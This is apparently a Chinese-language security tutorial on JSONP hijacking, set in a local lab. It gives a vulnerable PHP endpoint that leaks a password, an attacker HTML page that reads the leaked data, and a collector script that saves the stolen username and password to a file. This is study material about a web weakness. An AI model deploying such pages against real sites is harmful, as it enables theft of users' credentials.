# Jsonp劫持

## jsonp劫持的原理
使用json进行敏感信息传递。攻击机者写一个伪造的页面欺骗受害者点击这个页面，导致json信息被暗中采集。感觉和CSRF差不多...
利用手法大概如图：
![Qamm0x.png](https://s2.ax1x.com/2019/12/08/Qamm0x.png)

## 小试
jsonp.php
```php
<?php
header('Content-type: application/json');
$jsoncallback = htmlspecialchars($_REQUEST ['jsoncallback']);//获取回调函数名
//json数据
//$json_data = '["id","user"]';
if(isset($_REQUEST['jsoncallback'])){
	$json_data='({"id":"1","name":"Aaron","password":"1234567890"})';
	echo $jsoncallback . "(" . $json_data . ")";//输出jsonp格式的数据
}
?>
```
访问jsonp.php会得到json信息
![QamB9g.png](https://s2.ax1x.com/2019/12/08/QamB9g.png)

hijack.html
```javascript
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP劫持测试</title>
</head>
<body>
<script type="text/javascript">
function callbackFunction(result)
        {
            alert("username:"+result.name+" password:"+result.password);
        }
</script>
<script type="text/javascript" src="http://127.0.0.1/jsonp.php?jsoncallback=callbackFunction"></script>
</body>
</html>
```
![](https://s2.ax1x.com/2019/12/08/QamIgJ.png)

当然也可以写一个php接收请求，然后在把得到的内容保存到txt
vk.php
```php
<?php
$username=$_GET['username'];
$password=$_GET['password'];
if(isset($username)&&isset($password)){
	$data="用户名:".$username."密码:".$password;
	file_put_contents("pwd.txt",$data);
}
?>
```

修改js
```javascript
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>JSONP劫持测试</title>
</head>
<body>
<script type="text/javascript">
function callbackFunction(result)
        {
            var username=result.name;
			var password=result.password;
			const requests=new XMLHttpRequest();
			const url="http://127.0.0.1/vk.php?username="+username+"&password="+password;
			requests.open("GET",url);
			requests.send();
        }
</script>
<script type="text/javascript" src="http://127.0.0.1/jsonp.php?jsoncallback=callbackFunction"></script> <!-- 将得到的json转给callbackFunction函数处理
</body>
</html>
```
![](https://s2.ax1x.com/2019/12/08/QanWqI.png)

如果是被那种钓鱼的话，估计js会被混淆的很严重...

## 参考链接
[JSONP 劫持漏洞实例 - Bypass - 博客园](https://www.cnblogs.com/xiaozi/p/9963523.html)
[JSONP劫持](https://blog.csdn.net/u012628581/article/details/95495054)

## 实例
[360某json hijacking(只要你登陆访问，我就知道你的用户名，邮箱) \| 乌云漏洞库,乌云镜像站, WooYun 漏洞库, WooYun 镜像站](https://shuimugan.com/bug/view?bug_no=11284)